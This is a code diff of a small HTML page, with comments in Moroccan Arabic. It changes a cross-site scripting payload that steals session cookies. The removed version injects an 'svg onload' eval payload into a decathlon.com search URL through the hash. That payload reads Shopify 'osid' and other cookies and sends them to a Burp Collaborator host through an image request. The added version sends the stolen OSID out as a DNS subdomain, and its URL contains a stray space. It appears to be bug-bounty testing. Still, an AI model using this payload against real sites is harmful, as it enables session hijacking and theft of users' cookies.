@@ -2,27 +2,18 @@
 <html>
 <body>
     <script>
-        // سكريبت كيهز الـ Shopify OSID والـ Cookies لـ Burp
-        let payload = `
-            (function(){
-                // سحب الـ OSID بوحدو باش يجينا ساهل فـ القراية
-                var osid = document.cookie.match(/osid=([^;]+)/)?.[1] || "not_found";
-                var shop = document.cookie.match(/_shopify_y=([^;]+)/)?.[1] || "not_found";
-                
-                // الرابط ديال Burp Collaborator
-                var collab = "https://ct9ur0ilhbh2zhgrp7vq89d27tdk1gp5.oastify.com";
-                
-                // صيفط الداتا فـ الرابط ديال تصويرة
-                var i = new Image();
-                i.src = collab + "/?osid=" + osid + "&shop=" + shop + "&all=" + btoa(document.cookie).substring(0,100);
-            })();
-        `;
-
-        let encoded = encodeURIComponent(payload);
-        // استغلال الـ Hash (#) اللي نفعنا فـ الباي باس
-        let target = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encoded + "'))>";
-
-        window.location.href = target;
+        (function(){
+            // 1. هز الـ OSID من الكوكيز
+            var osid = document.cookie.match(/osid=([^;]+)/)?.[1] || "null";
+            
+            // 2. نقّي الـ OSID من أي رموز خايبة باش يدوز فـ الـ DNS
+            var cleanOsid = osid.replace(/[^a-zA-Z0-9]/g, "");
+            
+            // 3. صيفط الـ OSID كـ Subdomain لـ Burp Collaborator
+            // هاد الطلب غيخلي Burp يتوصل بـ DNS Query فيه الـ OSID ديال الضحية
+            var dnsExfil = new Image();
+            dnsExfil.src = "https://" + cleanOsid + " 69do7uyfx5xwfbwl51bko3twnntehb50.oastify.com/logo.png";
+        })();
     </script>
 </body>
 </html>
